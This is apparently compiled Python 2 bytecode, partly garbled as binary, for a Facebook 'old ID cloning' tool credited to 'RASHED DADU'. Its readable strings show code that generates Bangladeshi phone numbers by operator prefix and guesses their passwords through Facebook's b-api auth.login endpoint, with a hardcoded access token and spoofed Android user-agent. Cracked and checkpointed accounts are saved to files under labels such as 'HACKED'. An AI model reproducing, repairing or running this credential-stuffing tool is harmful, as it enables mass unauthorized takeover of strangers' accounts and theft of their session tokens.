|�bc�����������@���s���d��d�l��Z��d��d�l�Z�d��d�l�Z�d��d�l�Z�d��d�l�Z�d��d�l�Z�d��d�l�Z�d��d�l�Z�d��d�l�Z�d��d�l	�Z	�d��d�l

�Z

�d��d�l�Z�e��j�d���d����Z

�e��j�d���HHd�GHd�GHHe

�d���xJ�e�d���D]<�Z�e�j�d	�d

���Z�e�d�d���e�_�e�GHe�j�j����q��Wy�d��d�l�Z�Wn�e�k

�rGe��j�d

���n�Xy�d��d�l�Z�Wn8�e�k

�r�e��j�d���e�j�d���e��j�d���n�Xd��d�l�m�Z�d��d�l�m�Z�d��d�l�m�Z�e��j�d���e�e���e�j�d���e�j����Z �e �j!�e"���e �j#�e�j$�j%����d�d��d!�g�e �_&�d����Z'�d����Z(�d����Z)�d�Z*�d�Z+�g��Z,�g��a-�g��a.�g��Z/�d����Z0�d����Z1�e2�d �k�r�e0����n��d�S("���i����Ns���rm -rf .txtc���������C���sC���x<�|��d�D]0�}�t��j�j�|���t��j�j����t�j�d���q�Wd��S(���Ns���

g�������?(���t���syst���stdoutt���writet���flusht���timet���sleep(���t���zt���e(����(����s���/sdcard/BD-OLD.pyt���psb���s����

t���clears���no username & passwords���this tool is free by RASHED DADU����[1;32mYOU ENTERING BD SUPER FAST FB ID CLONING TOOL PLEASE WAIT......THIS TOOL MAKE BY RASHED DADU......ANY ONE COPY THIS CODE! CREDIT ME ........ RASHE DADU.....................................OPENING.............i'��iG��i���s���.txtt���as���pip2 install requestss���pip2 install mechanizei���s	���python2 C(���t

���ThreadPool(���t���ConnectionError(���t���Browsert���utf8t���max_timei���s

���user-agents��Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]c�����������C���s���Ht��j�j����d��S(���N(���t���osR����t���exit(����(����(����s���/sdcard/BD-OLD.pyt���exb:���s����c�����������C���s���t��j�d���d��S(���Ni���(���R���R���(����(����(����s���/sdcard/BD-OLD.pyt���tF���s����c�����������C���s���t��j�d���d��S(���NR	���(���R���t���system(����(����(����s���/sdcard/BD-OLD.pyt���cbJ���s����sE��

                                                                  

╔══════════════════════╗

║╔════════════════════╗╚╗

║║██░░░░░░░░░░░░░░░░░░╚╗╚╗

║║██░░░░░RASHED-DADU░░░░░ ─║

║║██░░░░░░░░░░░░░░░░░░╔╝╔╝

║╚════════════════════╝╔╝

╚══════════════════════╝ Author: RASHED DADU

i����c�����������C���s����t��j�d���t�GHd�d�GHHHHd�GHd�GHd�d�GHd�GHd�GHd�GHd	�GHd�GHd�d�GHd

�GHd�GHd�GHd

�GHd�GHd�GHd�d�GHt����d��S(���NR	���i2���t���-t����s���FB OLD ID CLONING [RASHED DADU]s���Codder.  : RASHED DADUs���AUTHOR   : RASHED DADUs.���FACEBOOK : https://www.facebook.com/Rashed.innocent.devil80s%���GITHUB   : https://github.com/Rashedul islamManikos���[1]  [1;96mGPs���[2]  [1;92mRobis���[3]  [1;96mAirtels���[4]  [1;92mBanglalinks���[5]  [1;93mTeletalks���[0]  [1;95mExit            (���R���R���t���logot���action(����(����(����s���/sdcard/BD-OLD.pyt���menu_���s.����

				c�������������s���t��d���}��|��d�k�r#�Ht����n�|��d�k�r��t�j�d���t�GHd�d�GHd�GHd�GHd�GHyO�t��d������d	���d

�}�x0�t�|�d���j����D]�}�t�j�|�j	������q��WWq�t

�k

�r��d�GHt��d

���t����q�Xn�|��d�k�r�t�j�d���t�GHd�d�GHd�GHd�GHd�GHyO�t��d������d	���d

�}�x0�t�|�d���j����D]�}�t�j�|�j	������q<WWq�t

�k

�r�d�GHt��d

���t����q�Xn7|��d�k�r9t�j�d���t�GHd�d�GHd�GHd�GHd�GHyO�t��d������d	���d

�}�x0�t�|�d���j����D]�}�t�j�|�j	������q�WWq�t

�k

�r5d�GHt��d

���t����q�Xn�|��d�k�r�t�j�d���t�GHd�d�GHd�GHd�GHd�GHyO�t��d������d	���d

�}�x0�t�|�d���j����D]�}�t�j�|�j	������q�WWq�t

�k

�r�d�GHt��d

���t����q�Xn��|��d�k�r�t�j�d���t�GHHHHd�d�GHd�GHd�GHd�GHyO�t��d������d	���d

�}�x0�t�|�d���j����D]�}�t�j�|�j	������qUWWq�t

�k

�r�d�GHt��d

���t����q�Xn�|��d�k�r�t����n�Ht����t

�t�t�����}�d�GHd�d�GHt�d�|���t�j�d���t�d���t�j�d���t�d���t�j�d���t�d�d���t�j�d���Hd�d�H�����f�d����}�t�d���}�|�j�|�t���Hd�d�HHd�t

�t�t�����d�t

�t�t�����d �GHt��d!���t�j�d"���d��S(#���Ns

���

  ===>   R���t���1R	���i2���R���s_���170,171, 172, 173, 174, 175, 176, 177, 178, 179,130,131, 132, 133, 134, 135, 136, 137, 138, 139s��� Choose Code  : s���+880s���.txtt���rs���[!] File Not Founds	���

[ Back ]t���2s/���180,181, 182, 183, 184, 185, 186, 187, 188, 189t���3s/���160,161, 162, 163, 164, 165, 166, 167, 168, 169t���4s_���190,191, 192, 193, 194, 195, 196, 197, 198, 199,140,141, 142, 143, 144, 145, 146, 147, 148, 149t���5s/���150,151, 152, 153, 154, 155, 156, 157, 158, 159t���0s���[✓] Total Numbers: g�������?s)���[✓] Please wait, process is running ...g�������?s+���[!] To Stop Process Press CTRL Then Press zc���	���������s���|��}�y�t��j�d���Wn�t�k

�r*�n�XyY�����|�}�|�d�d�!}�|�}�t�j�d������|�d�|�d���}�t�j�|���}�d�|�k�rd������|�d	�|�d

�d

�GHt�d�d���}�|�j������|�d

�|�d

���|�j����t	�j

����|�|���n�d�|�d�k�r�d������|�d	�|�d�GHt�d�d���}�|�j������|�d

�|�d

���|�j����t�j

����|�|���n��Wn�n�Xd��S(���Nt���savei���i���s����https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s���&locale=en_US&password=sH���&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efmt���access_tokens���[1;92m[RASHED-DADU-HACKED][0m s��� | s���

s���save/successfull.txtR

���t���|s���www.facebook.comt	���error_msgs���[1;93m[RASHED-DADU-CP][1;97m s-���[1;93m[(RASHED-DADU)Open After 03 Days][0m 

s���save/checkpoint.txt(���R���t���mkdirt���OSErrort���brt���opent���jsont���loadR���t���closet���okst���appendt���cpb(	���t���argt���usert���resultt���digi11t���pass1t���datat���qt���okbt���cps(���t���ct���k(����s���/sdcard/BD-OLD.pyt���main����s2����



'!!

!

i���s���[✓] Total OK/CP : t���/s2���[✓] CP File Has Been Saved : save/checkpoint.txts���

[Press Enter To Go Back]s���python2 Bangla.py(���t	���raw_inputR���R���R���R���R)���t	���readlinest���idR.���t���stript���IOErrorR���R���t���strt���lenR���R���R���R���t���mapR-���R/���(���t���bcht���idlistt���linet���xxxR;���t���p(����(���R9���R:���s���/sdcard/BD-OLD.pyR���y���s�����



	





	





	





	





	





	











(

t���__main__(���s

���user-agents��Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;](3���R���R����R���t���datetimet���randomt���hashlibt���ret	���threadingR*���t���urllibt	���cookielibt���getpassR���R���t���ranget���nt���randintt���nmbrR)���R���R���t���requestst���ImportErrort	���mechanizeR���t���multiprocessing.poolR���t���requests.exceptionsR���R

���t���reloadt���setdefaultencodingR(���t���set_handle_robotst���Falset���set_handle_refresht���_httpt���HTTPRefreshProcessort

���addheadersR���R���R���R���t���backt

���successfulR/���R-���R?���R���R���t���__name__(����(����(����s���/sdcard/BD-OLD.pyt���<module>���s^����

	



















					�|;
